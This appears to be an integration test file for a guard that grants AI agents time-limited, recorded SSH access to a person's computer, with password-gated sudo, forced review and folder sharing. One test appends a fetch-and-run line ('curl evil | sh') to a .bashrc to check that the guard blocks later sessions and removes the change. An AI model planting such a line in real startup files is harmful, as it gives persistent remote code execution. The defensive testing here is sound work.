/**
 * The guard with a real `sshd -i` and the real wrapper (#20). Needs OpenSSH unpacked (`OMP_APP_DEVICE_TEST_OPENSSH`: a
 * folder with `usr/sbin/sshd`, `usr/lib/openssh/` and `libwrap`) and a folder sshd's StrictModes accepts
 * (`OMP_APP_DEVICE_TEST_DIR`: not world-writable); skipped without them. Sessions run as the account running the tests.
 */
import { afterEach, describe, expect, test } from "bun:test";
import { existsSync } from "node:fs";
import { lstat, mkdir, mkdtemp, readFile, realpath, rm, symlink } from "node:fs/promises";
import { userInfo } from "node:os";
import { join } from "node:path";
import { SystemAgentAccount } from "./account";
import {
  Guard,
  type GuardAction,
  LONGEST_ON_MINUTES,
  lengthText,
  reviewText,
  type WrapperEvent,
} from "./guard";
import { ChildLauncher } from "./launcher";
import { SharedFolders } from "./shared";
import { REQUIRED_SETTINGS, sessionConfig } from "./sshd-config";

const OPENSSH = process.env.OMP_APP_DEVICE_TEST_OPENSSH ?? "";
const BASE = process.env.OMP_APP_DEVICE_TEST_DIR ?? "";
const ready = OPENSSH !== "" && BASE !== "";
const LIB = join(OPENSSH, "usr/lib/x86_64-linux-gnu");
const SSHD = ["env", `LD_LIBRARY_PATH=${LIB}`, join(OPENSSH, "usr/sbin/sshd")];
const SFTP = join(OPENSSH, "usr/lib/openssh/sftp-server");
const BUN = process.execPath;
const WRAPPER = `env LD_LIBRARY_PATH=${LIB} ${BUN} ${join(import.meta.dir, "../wrapper/main.ts")}`;
const BRIDGE = join(import.meta.dir, "test-bridge.ts");
const account = userInfo().username;

let dir: string | null = null;
let guard: Guard | null = null;
afterEach(async () => {
  await guard?.stop();
  guard = null;
  if (dir !== null) await rm(dir, { recursive: true, force: true });
  dir = null;
});

const keygen = async (path: string) => {
  await Bun.spawn(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "", "-f", path]).exited;
  return (await readFile(`${path}.pub`, "utf8")).trim();
};

/**
 * `verify` answers the password check (a function to hold it); `grantMs` makes writing a sudo grant take that long;
 * `askMs` gives the guard folder sharing, with a person's home of the test's own and mounts only noted.
 */
async function setUp(
  verify:
    | boolean
    | ((pid: number, action: GuardAction, message: string) => Promise<boolean>) = true,
  grantMs = 0,
  askMs?: number,
) {
  dir = await mkdtemp(join(BASE, "guard-"));
  const hostKey = join(dir, "host_ed25519");
  const hostPublic = await keygen(hostKey);
  const clientPublic = await keygen(join(dir, "client"));
  const events: WrapperEvent[] = [];
  const logged: string[] = [];
  const sudoCalls: string[] = [];
  /** logind's delay lock on sleep: "held" when taken, "released" when let go. */
  const sleepLock: string[] = [];
  // The real reset, on a home of the test's own, with the account's shell /bin/sh; the system commands (pkill, crontab,
  // atrm, loginctl) are only noted: they would act on the test runner's own account.
  const commands: string[] = [];
  const passwd = join(dir, "passwd");
  // The person's home, with a folder to share and a secret one; mounts are only noted (they need root).
  const personHome = join(dir, "person");
  for (const each of ["projects/app", ".ssh"])
    await mkdir(join(personHome, each), { recursive: true });
  const shareRoot = join(dir, "run", "shared");
  const mounted = new Set<string>();
  const mountCalls: string[] = [];
  const folders =
    askMs === undefined
      ? {}
      : {
          folders: {
            shared: new SharedFolders(join(dir, "state", "shared.json")),
            person: { home: await realpath(personHome), uid: process.getuid?.() ?? 0 },
            root: shareRoot,
            askMs,
            mounter: {
              mount: async (source: string, target: string, write: boolean) => {
                mountCalls.push(`mount ${source} ${target} ${write ? "rw" : "ro"}`);
                mounted.add(target);
                return null;
              },
              unmount: async (target: string) => {
                mountCalls.push(`unmount ${target}`);
                mounted.delete(target);
              },
              mounted: async (root: string) =>
                [...mounted]
                  .filter((each) => each.startsWith(`${root}/`))
                  .sort((a, b) => b.length - a.length),
            },
          },
        };
  await Bun.write(passwd, `${account}:x:1000:1000::${join(dir, "home")}:/bin/sh\n`);
  guard = new Guard({
    runDir: join(dir, "run"),
    account,
    hostKey,
    wrapper: WRAPPER,
    sftpServer: SFTP,
    // OpenSSH 10 runs each connection in sshd-session and sshd-auth; 9.6 (what the packages bundle) has neither.
    ...(existsSync(join(OPENSSH, "usr/lib/openssh/sshd-session"))
      ? {
          sshdSession: join(OPENSSH, "usr/lib/openssh/sshd-session"),
          sshdAuth: join(OPENSSH, "usr/lib/openssh/sshd-auth"),
        }
      : {}),
    launcher: new ChildLauncher(SSHD),
    verify: typeof verify === "function" ? verify : async () => verify,
    maxOnMs: LONGEST_ON_MINUTES * 60_000,
    log: (line) => logged.push(line),
    stateDir: join(dir, "state"),
    watchPaths: [join(dir, "home", ".bashrc"), join(dir, "home", ".ssh")],
    agentAccount: new SystemAgentAccount({
      account,
      home: join(dir, "home"),
      inHome: [".bashrc", ".ssh", ".config/autostart"],
      passwd,
      run: async (argv) => {
        commands.push(argv.join(" "));
        return 1;
      },
    }),
    sudo: {
      grant: async (each) => {
        await Bun.sleep(grantMs);
        sudoCalls.push(`grant ${each}`);
        return null;
      },
      revoke: async () => {
        sudoCalls.push("revoke");
      },
    },
    holdSleep: () => {
      sleepLock.push("held");
      return () => sleepLock.push("released");
    },
    ...folders,
  });
  await guard.start();
  await Bun.write(join(dir, "known_hosts"), `device ${hostPublic}\n`);
  // The agent's view: every event the guard tells, on a `watch` connection.
  let buffer = "";
  await Bun.connect({
    unix: guard.controlSocket,
    socket: {
      open: (socket) => {
        socket.write(`${JSON.stringify({ op: "watch" })}\n`);
      },
      data: (_socket, chunk) => {
        buffer += new TextDecoder().decode(chunk);
        for (let at = buffer.indexOf("\n"); at !== -1; at = buffer.indexOf("\n")) {
          const line = JSON.parse(buffer.slice(0, at)) as { type: string; event?: WrapperEvent };
          buffer = buffer.slice(at + 1);
          if (line.type === "wrapper" && line.event !== undefined) events.push(line.event);
        }
      },
    },
  });
  const sshArgs = (stream: number, options: readonly string[], rest: readonly string[]) => [
    "ssh",
    "-F",
    "/dev/null",
    "-o",
    "BatchMode=yes",
    "-o",
    `UserKnownHostsFile=${join(dir ?? "", "known_hosts")}`,
    "-o",
    "StrictHostKeyChecking=yes",
    "-o",
    `ProxyCommand=${BUN} ${BRIDGE} ${guard?.controlSocket} ${stream}`,
    "-i",
    join(dir ?? "", "client"),
    ...options,
    `${account}@device`,
    ...rest,
  ];
  const ssh = (stream: number, ...args: string[]) =>
    Bun.spawn(sshArgs(stream, [], args), { stdin: "ignore", stdout: "pipe", stderr: "pipe" });
  /** An interactive session (a terminal, no command) typed into from `input`. */
  const shell = (stream: number) =>
    Bun.spawn(sshArgs(stream, ["-tt"], []), { stdin: "pipe", stdout: "pipe", stderr: "pipe" });
  /** A file copy (scp over sftp) of `from` to `to`, a path on the machine. */
  const scp = (stream: number, from: string, to: string) =>
    Bun.spawn(["scp", ...sshArgs(stream, [], []).slice(1, -1), from, `${account}@device:${to}`], {
      stdin: "ignore",
      stdout: "pipe",
      stderr: "pipe",
    });
  return {
    personHome: await realpath(personHome),
    shareRoot,
    mountCalls,
    clientPublic,
    events,
    logged,
    sudoCalls,
    sleepLock,
    commands,
    ssh,
    shell,
    scp,
    guard: guard as Guard,
  };
}

describe.skipIf(!ready)("the guard with a real sshd (#20)", () => {
  test("a session's config holds every setting a session needs, as sshd itself reads it", async () => {
    dir = await mkdtemp(join(BASE, "config-"));
    const path = join(dir, "sshd.conf");
    await Bun.write(
      path,
      sessionConfig({
        account,
        hostKey: join(dir, "host"),
        authorizedKeys: join(dir, "keys"),
        wrapper: "/usr/lib/omp-app-device/wrapper",
        sftpServer: SFTP,
        stream: 4,
        recordsSocket: join(dir, "records.sock"),
      }),
    );
    await keygen(join(dir, "host"));
    const proc = Bun.spawn(
      [...SSHD, "-T", "-f", path, "-C", `user=${account},host=x,addr=127.0.0.1`],
      {
        stdout: "pipe",
        stderr: "pipe",
      },
    );
    const printed = new Map(
      (await new Response(proc.stdout).text())
        .split("\n")
        .map(
          (line) => [line.slice(0, line.indexOf(" ")), line.slice(line.indexOf(" ") + 1)] as const,
        ),
    );
    for (const [setting, value] of Object.entries(REQUIRED_SETTINGS))
      expect([setting, printed.get(setting)]).toEqual([setting, value]);
    expect(printed.get("forcecommand")).toBe("/usr/lib/omp-app-device/wrapper");
  });

  test("off by default; on only once the password was given; then only the turn-on's key gets in", async () => {
    const refused = await setUp(false);
    expect(await refused.guard.on(process.pid, 30, refused.clientPublic)).toBe(
      "the password was not given",
    );
    const off = refused.ssh(1, "true");
    expect(await off.exited).toBe(255);
    expect(await new Response(off.stderr).text()).toContain("agent access is off");
  });

  test("a command runs through the wrapper as the agent account; what it printed and how it ended reach the guard", async () => {
    const h = await setUp();
    expect(await h.guard.on(process.pid, 30, h.clientPublic)).toBeNull();
    const session = h.ssh(1, "echo hello from the machine; exit 3");
    expect(await session.exited).toBe(3);
    expect(await new Response(session.stdout).text()).toBe("hello from the machine\n");
    await Bun.sleep(100);
    const [start, ...rest] = h.events;
    expect(start).toMatchObject({
      type: "start",
      stream: 1,
      kind: "command",
      command: "echo hello from the machine; exit 3",
    });
    const shown = rest
      .flatMap((each) =>
        each.type === "output" ? [Buffer.from(each.bytes, "base64").toString()] : [],
      )
      .join("");
    expect(shown).toBe("hello from the machine\n");
    expect(rest.at(-1)).toMatchObject({ type: "end", exitCode: 3 });
    // The log keeps what ran and how it ended, never the output.
    expect(h.logged.some((line) => line.includes('"type":"start"'))).toBe(true);
    expect(h.logged.some((line) => line.includes('"type":"output"'))).toBe(false);
  });

  test("turning off ends a running session at once and refuses the next", async () => {
    const h = await setUp();
    await h.guard.on(process.pid, 30, h.clientPublic);
    const long = h.ssh(2, "sleep 600");
    await Bun.sleep(1_500);
    const at = Date.now();
    await h.guard.off();
    await long.exited;
    expect(Date.now() - at).toBeLessThan(2_000);
    expect(await h.ssh(3, "true").exited).toBe(255);
  });

  test("an interactive session runs, and what its terminal shows reaches the records", async () => {
    const h = await setUp();
    await h.guard.on(process.pid, 30, h.clientPublic);
    const session = h.shell(1);
    await Bun.sleep(1_500);
    session.stdin.write("echo interactive-$((6*7))\n");
    await Bun.sleep(1_000);
    session.stdin.write("exit 0\n");
    session.stdin.end();
    expect(await session.exited).toBe(0);
    expect(new TextDecoder().decode(await new Response(session.stdout).arrayBuffer())).toContain(
      "interactive-42",
    );
    const shown = h.events
      .filter((event) => event.type === "output")
      .map((event) => Buffer.from(event.bytes, "base64").toString())
      .join("");
    expect(shown).toContain("interactive-42");
    expect(h.events.find((event) => event.type === "start")).toMatchObject({ kind: "shell" });
    expect(h.events.find((event) => event.type === "end")).toMatchObject({ exitCode: 0 });
  });

  test("the records socket takes at most 128 connections and drops one that starts no run within 2 s; the guard still answers (audit 2 F1)", async () => {
    const h = await setUp();
    await h.guard.on(process.pid, 30, h.clientPublic);
    let closed = 0;
    const held = await Promise.all(
      Array.from({ length: 140 }, () =>
        Bun.connect({
          unix: h.guard.recordsSocket,
          socket: {
            data() {},
            close() {
              closed += 1;
            },
          },
        }),
      ),
    );
    await Bun.sleep(300);
    // Past the limit: refused at once.
    expect(closed).toBeGreaterThanOrEqual(12);
    // The person's side still answers while the records socket is full.
    const answer = await new Promise<string>((resolve) => {
      let text = "";
      void Bun.connect({
        unix: h.guard.controlSocket,
        socket: {
          open: (socket) => {
            socket.write(`${JSON.stringify({ op: "state" })}\n`);
          },
          data: (_socket, chunk) => {
            text += new TextDecoder().decode(chunk);
          },
          close: () => resolve(text),
        },
      });
    });
    expect(answer.startsWith("ok ")).toBe(true);
    await Bun.sleep(2_200);
    // None started a run: all dropped, and a real session's run is taken again.
    expect(closed).toBe(140);
    for (const socket of held) socket.end();
    expect(await h.ssh(1, "true").exited).toBe(0);
  });

  test("a file copy runs over sftp, and the live view names the file it wrote (audit 2 F2)", async () => {
    const h = await setUp();
    await h.guard.on(process.pid, 30, h.clientPublic);
    const from = join(dir ?? "", "notes.txt");
    const to = join(dir ?? "", "copied-notes.txt");
    await Bun.write(from, "agent copy\n");
    expect(await h.scp(1, from, to).exited).toBe(0);
    expect(await readFile(to, "utf8")).toBe("agent copy\n");
    for (let waited = 0; !h.events.some((event) => event.type === "end"); waited += 50) {
      if (waited > 10_000) throw new Error("the copy's end never reached the live view");
      await Bun.sleep(50);
    }
    expect(h.events.find((event) => event.type === "start")).toMatchObject({ kind: "sftp" });
    const shown = h.events
      .filter((event) => event.type === "output")
      .map((event) => Buffer.from(event.bytes, "base64").toString())
      .join("");
    expect(shown).toContain(`open "${to}"`);
  }, 30_000);

  test("one run's output flood is held back in the live view and said, not shown (audit 2 F3)", async () => {
    const h = await setUp();
    await h.guard.on(process.pid, 30, h.clientPublic);
    const session = h.ssh(1, "head -c 4000000 /dev/zero | tr '\\0' a");
    await new Response(session.stdout).arrayBuffer();
    expect(await session.exited).toBe(0);
    // The live view is told after the session: wait for the run's end there.
    for (let waited = 0; !h.events.some((event) => event.type === "end"); waited += 50) {
      if (waited > 10_000) throw new Error("the run's end never reached the live view");
      await Bun.sleep(50);
    }
    const shown = h.events
      .filter((event) => event.type === "output")
      .map((event) => Buffer.from(event.bytes, "base64").toString())
      .join("");
    expect(shown.length).toBeLessThan(2_500_000);
    expect(shown).toMatch(/\[agent access: \d+ bytes of this run's output not shown\]/);
  }, 30_000);

  test("a key other than the turn-on's is refused", async () => {
    const h = await setUp();
    const other = await keygen(join(dir ?? "", "other"));
    await h.guard.on(process.pid, 30, other);
    expect(await h.ssh(1, "true").exited).toBe(255);
  });

  test("the records socket takes a run's start only for a stream with a session, one run per connection; nothing else is answered", async () => {
    const h = await setUp();
    await h.guard.on(process.pid, 30, h.clientPublic);
    const session = h.ssh(1, "sleep 3");
    await Bun.sleep(1_000);
    /** What the guard answers lines sent on a connection of their own, and whether it closed it. */
    const send = async (...lines: object[]) => {
      let answer = "";
      let closed = false;
      const socket = await Bun.connect({
        unix: h.guard.recordsSocket,
        socket: {
          data(_socket, chunk) {
            answer += new TextDecoder().decode(chunk);
          },
          close() {
            closed = true;
          },
        },
      });
      for (const line of lines) socket.write(`${JSON.stringify(line)}\n`);
      await Bun.sleep(300);
      socket.end();
      return { answer, closed };
    };
    const start = (stream: number, run: string) => ({
      type: "start",
      stream,
      run,
      kind: "command",
      command: "true",
      folder: "/",
      startedAt: new Date().toISOString(),
    });
    // No session on stream 9: refused, so its wrapper would run nothing.
    expect(await send(start(9, "a".repeat(16)))).toEqual({ answer: "", closed: true });
    // A second start on a connection already bound to a run.
    expect((await send(start(1, "b".repeat(16)), start(1, "c".repeat(16)))).answer).toBe("ok\n");
    // An end for a run this connection never started.
    expect(
      await send({
        type: "end",
        stream: 1,
        run: "d".repeat(16),
        exitCode: 0,
        endedAt: new Date().toISOString(),
      }),
    ).toEqual({ answer: "", closed: true });
    // The log has the session's own run and the one start taken here, nothing refused.
    expect(
      h.logged.filter((line) => line.includes('"type":"start"') && line.includes('"stream":1')),
    ).toHaveLength(2);
    await session.exited;
  });

  test("Extend adds the time asked while on, never past the longest turn-on from now", async () => {
    const h = await setUp();
    expect(await h.guard.extend(process.pid, 60)).toBe("agent access is off");
    await h.guard.on(process.pid, 30, h.clientPublic);
    const left = () => Date.parse(h.guard.state().until ?? "") - Date.now();
    expect(await h.guard.extend(process.pid, 15)).toBeNull();
    expect(left()).toBeGreaterThan(44 * 60_000);
    expect(left()).toBeLessThanOrEqual(45 * 60_000);
    expect(await h.guard.extend(process.pid, 60)).toBeNull();
    expect(left()).toBeGreaterThan(104 * 60_000);
    expect(left()).toBeLessThanOrEqual(105 * 60_000);
    expect(await h.guard.extend(process.pid, 480)).toBeNull();
    expect(left()).toBeGreaterThan(479 * 60_000);
    expect(left()).toBeLessThanOrEqual(480 * 60_000);
  });

  test("the password dialog states what will be granted, after the limits, whatever was asked", async () => {
    const said: string[] = [];
    const h = await setUp(async (_pid, _action, message) => {
      said.push(message);
      return true;
    });
    await h.guard.on(process.pid, 600, h.clientPublic, "server.example:8445");
    await h.guard.extend(process.pid, 200, "server.example:8445");
    await h.guard.sudo(process.pid, 30, "server.example:8445");
    expect(said[0]).toContain("for 8 hours.");
    expect(said[1]).toContain("for an additional 3 hours 20 minutes, up to 8 hours from now");
    expect(said[2]).toContain("for 30 minutes, never past the end of access");
    // Each names whose agents get it.
    for (const each of said)
      expect(each).toStartWith("Agents of the omp-app server server.example:8445 ");
  });

  test("the review's password dialog lists what changed, each entry one short line", () => {
    const tricky = `a\nb\u202Ec${"x".repeat(200)}`;
    const text = reviewText(["sudo was allowed", tricky, "c", "d", "e", "f", "g"]);
    expect(text).toStartWith("sudo was allowed; a b c");
    expect(text).not.toMatch(/[\n\u202E]/);
    expect(text).toContain("…; c; d; e; and 2 more");
  });

  test("lengthText reads as words", () => {
    expect(lengthText(120)).toBe("2 hours");
    expect(lengthText(480)).toBe("8 hours");
    expect(lengthText(90)).toBe("1 hour 30 minutes");
    expect(lengthText(1)).toBe("1 minute");
    expect(lengthText(45)).toBe("45 minutes");
  });

  test("while on, sleep waits for off: the delay lock is taken at turn-on and let go only once off has finished", async () => {
    const h = await setUp();
    expect(h.sleepLock).toEqual([]);
    await h.guard.on(process.pid, 30, h.clientPublic);
    // Turning on again (a new time) and extending keep the one lock.
    await h.guard.on(process.pid, 60, h.clientPublic);
    await h.guard.extend(process.pid, 15);
    expect(h.sleepLock).toEqual(["held"]);
    const off = h.guard.off();
    // Not before the key and the sessions are gone: the lock goes last.
    expect(h.sleepLock).toEqual(["held"]);
    await off;
    expect(h.sleepLock).toEqual(["held", "released"]);
    expect(existsSync(join(dir ?? "", "run", "authorized_keys"))).toBe(false);
    // An off while off has nothing to let go.
    await h.guard.off();
    expect(h.sleepLock).toEqual(["held", "released"]);
  });

  test("sudo for the agent account only while on and with the password; it ends when access turns off", async () => {
    const h = await setUp();
    expect(await h.guard.sudo(process.pid, 30)).toBe("agent access is off");
    await h.guard.on(process.pid, 60, h.clientPublic);
    h.sudoCalls.length = 0;
    expect(await h.guard.sudo(process.pid, 30)).toBeNull();
    expect(h.sudoCalls).toEqual([`grant ${account}`]);
    expect(h.guard.state().sudoUntil).not.toBeNull();
    await h.guard.off();
    expect(h.sudoCalls.at(-1)).toBe("revoke");
    expect(h.guard.state().sudoUntil).toBeNull();
  });

  test("a startup file a session changed blocks the next session; off ends the account's processes and removes what it planted, never following a link out of the home", async () => {
    const h = await setUp();
    const home = join(dir ?? "", "home");
    const outside = join(dir ?? "", "outside");
    await Bun.write(join(outside, "autostart", "keep.desktop"), "the person's own\n");
    await mkdir(home, { recursive: true });
    expect(await h.guard.on(process.pid, 30, h.clientPublic)).toBeNull();
    const bashrc = join(home, ".bashrc");
    expect(await h.ssh(1, `echo 'curl evil | sh' >> ${bashrc}`).exited).toBe(0);
    const next = h.ssh(2, "true");
    expect(await next.exited).toBe(255);
    expect(await new Response(next.stderr).text()).toContain(
      "a startup file changed during this access",
    );
    // A link the session made, so that removing `~/.config/autostart` would reach outside the home.
    await symlink(outside, join(home, ".config"));
    h.commands.length = 0;
    await h.guard.off();
    expect(existsSync(bashrc)).toBe(false);
    expect(await lstat(join(home, ".config")).catch(() => null)).toBeNull();
    expect(await readFile(join(outside, "autostart", "keep.desktop"), "utf8")).toBe(
      "the person's own\n",
    );
    expect(h.guard.state()).toMatchObject({
      reviewPending: false,
      removed: ["~/.bashrc", "~/.config"],
    });
    expect(h.commands).toEqual(
      expect.arrayContaining([
        `pkill -KILL -u ${account}`,
        `crontab -r -u ${account}`,
        `loginctl disable-linger ${account}`,
      ]),
    );
    // Nothing planted is left, so nothing holds the next turn-on.
    expect(await h.guard.on(process.pid, 30, h.clientPublic)).toBeNull();
  });

  test("a sudo grant that finishes after an off is taken back: it never outlives its access (audit 2 F8)", async () => {
    const h = await setUp(true, 300);
    await h.guard.on(process.pid, 30, h.clientPublic);
    const granting = h.guard.sudo(process.pid, 10);
    await Bun.sleep(100);
    await h.guard.off();
    expect(await granting).toBe("agent access is off");
    expect(h.sudoCalls.at(-1)).toBe("revoke");
    expect(h.sudoCalls.lastIndexOf("revoke")).toBeGreaterThan(
      h.sudoCalls.indexOf(`grant ${account}`),
    );
    expect(h.guard.state().sudoUntil).toBeNull();
  });

  test("an off that leaves a review while the next turn-on's password is asked holds that turn-on (audit 2 F8)", async () => {
    let release = (_: boolean) => {};
    let asked = 0;
    const h = await setUp(async () => {
      asked += 1;
      // Passwords 1 to 3: on, sudo, extend. The 4th (a turn-on asked while on) waits until the test releases it.
      if (asked < 4) return true;
      return await new Promise<boolean>((resolve) => {
        release = resolve;
      });
    });
    await h.guard.on(process.pid, 30, h.clientPublic);
    expect(await h.guard.sudo(process.pid, 10)).toBeNull();
    expect(await h.guard.extend(process.pid, 60)).toBeNull();
    // A turn-on while on (to set a new time) whose password is still being asked when an off comes.
    const again = h.guard.on(process.pid, 30, h.clientPublic);
    await Bun.sleep(100);
    await h.guard.off();
    expect(h.guard.state().reviewPending).toBe(true);
    release(true);
    expect(await again).toContain("must be reviewed first");
    expect(h.guard.state().on).toBe(false);
  });

  test("each password is asked for its own action, so the dialog says what it allows (audit 2 F5)", async () => {
    const asked: GuardAction[] = [];
    const h = await setUp(async (_pid, action) => {
      asked.push(action);
      return true;
    });
    await h.guard.on(process.pid, 30, h.clientPublic);
    await h.guard.extend(process.pid, 60);
    await h.guard.sudo(process.pid, 10);
    await h.guard.off();
    await h.guard.acknowledge(process.pid);
    expect(asked).toEqual(["turn-on", "extend", "sudo", "acknowledge"]);
    // Every action exists in the policy the install guide copies.
    const policy = await readFile(
      join(import.meta.dir, "../../system/dev.ompapp.device.policy"),
      "utf8",
    );
    for (const action of asked) expect(policy).toContain(`id="dev.ompapp.device.${action}"`);
  });

  test("after a sudo grant the next turn-on waits until the person has looked the computer over", async () => {
    const h = await setUp();
    await h.guard.on(process.pid, 30, h.clientPublic);
    expect(await h.guard.sudo(process.pid, 10)).toBeNull();
    await h.guard.off();
    expect(h.guard.state().reviewPending).toBe(true);
    expect(h.guard.state().changed[0]).toContain("Sudo was allowed");
    const refused = await h.guard.on(process.pid, 30, h.clientPublic);
    expect(refused).toContain("Sudo was allowed during this session");
    expect(refused).toContain("omp-app-device acknowledge");
    expect(await h.guard.acknowledge(process.pid)).toBeNull();
    expect(await h.guard.on(process.pid, 30, h.clientPublic)).toBeNull();
  });

  test("an agent asks for a folder from its session: it waits for the person, is mounted while on, and covered, secret, denied, ended and removed requests are answered (PLAN §7d)", async () => {
    const messages: string[] = [];
    const h = await setUp(
      async (_pid, action, message) => {
        messages.push(`${action}: ${message}`);
        return true;
      },
      0,
      60_000,
    );
    const ASK = `${BUN} ${join(import.meta.dir, "../main.ts")} ask-folder`;
    /** `omp-app-device ask-folder` run in a session, as an agent runs it. */
    const ask = (stream: number, args: string) => {
      const proc = h.ssh(stream, `${ASK} ${args}`);
      return (async () => {
        const [out, err, code] = await Promise.all([
          new Response(proc.stdout).text(),
          new Response(proc.stderr).text(),
          proc.exited,
        ]);
        return { code, out: out.trim(), err };
      })();
    };
    const waiting = async () => {
      for (let tries = 0; tries < 100 && h.guard.state().asks.length === 0; tries += 1)
        await Bun.sleep(100);
      const [asked] = h.guard.state().asks;
      if (asked === undefined) throw new Error("no request reached the guard");
      return asked;
    };
    const workspace = join(h.personHome, "projects");
    const mountedAt = join(h.shareRoot, "projects");
    expect(await h.guard.on(process.pid, 30, h.clientPublic)).toBeNull();

    // Asked to change files, with a control character in the reason; the person allows reading only.
    const first = ask(1, `'~/projects' --write --why 'Read the build'$'\\a'' logs'`);
    const asked = await waiting();
    expect(asked).toMatchObject({ path: workspace, write: true, why: "Read the build  logs" });
    expect(await h.guard.allowFolder(process.pid, asked.id, false, "server.example")).toBeNull();
    expect(messages.at(-1)).toBe(
      `share-folder: Agents of the omp-app server server.example will be able to read the files in ${workspace} whenever agent access is on, until you remove it from Shared folders.`,
    );
    const allowed = await first;
    expect(allowed).toMatchObject({ code: 0, out: mountedAt });
    expect(allowed.err).toContain("(read only)");
    expect(h.mountCalls).toEqual([`mount ${workspace} ${mountedAt} ro`]);
    expect(h.guard.state().shared).toMatchObject([
      { path: workspace, place: "projects", write: false },
    ]);

    // A folder inside it is reachable already; to change it, or a secret folder, is refused at once.
    expect(await ask(2, `${workspace}/app`)).toMatchObject({
      code: 0,
      out: join(mountedAt, "app"),
    });
    const inside = await ask(2, `${workspace}/app --write`);
    expect(inside.code).toBe(1);
    expect(inside.err).toContain("shared read only");
    const secret = await ask(3, "'~/.ssh'");
    expect(secret.code).toBe(1);
    expect(secret.err).toContain("~/.ssh");
    expect(h.mountCalls).toHaveLength(1);

    // Off unmounts it, and the next turn-on mounts it again before any session.
    await h.guard.off();
    expect(h.mountCalls.at(-1)).toBe(`unmount ${mountedAt}`);
    expect(await h.guard.on(process.pid, 30, h.clientPublic)).toBeNull();
    expect(h.mountCalls.at(-1)).toBe(`mount ${workspace} ${mountedAt} ro`);

    // Denied; then a request still waiting at off is answered.
    const denied = ask(4, `${workspace} --write`);
    expect(h.guard.denyFolder((await waiting()).id)).toBeNull();
    expect(await denied).toMatchObject({ code: 1 });
    expect((await denied).err).toContain("did not allow");
    // A request still waiting at off: the session ends with it, and the request is gone.
    const ended = ask(5, `${workspace} --write`);
    await waiting();
    await h.guard.off();
    expect((await ended).code).not.toBe(0);
    expect(h.guard.state().asks).toEqual([]);

    // To change files, allowed: mounted again, for writing; Remove unmounts it and forgets it.
    expect(await h.guard.on(process.pid, 30, h.clientPublic)).toBeNull();
    const writes = ask(6, `${workspace} --write`);
    expect(await h.guard.allowFolder(process.pid, (await waiting()).id, true)).toBeNull();
    expect(messages.at(-1)).toContain("will be able to read and change the files in");
    expect((await writes).err).toContain("(read and change)");
    expect(h.mountCalls.slice(-2)).toEqual([
      `unmount ${mountedAt}`,
      `mount ${workspace} ${mountedAt} rw`,
    ]);
    expect(await h.guard.removeFolder(workspace)).toBeNull();
    expect(h.mountCalls.at(-1)).toBe(`unmount ${mountedAt}`);
    expect(h.guard.state().shared).toEqual([]);
    expect(await h.guard.removeFolder(workspace)).toBe("that folder is not shared");
  });
});
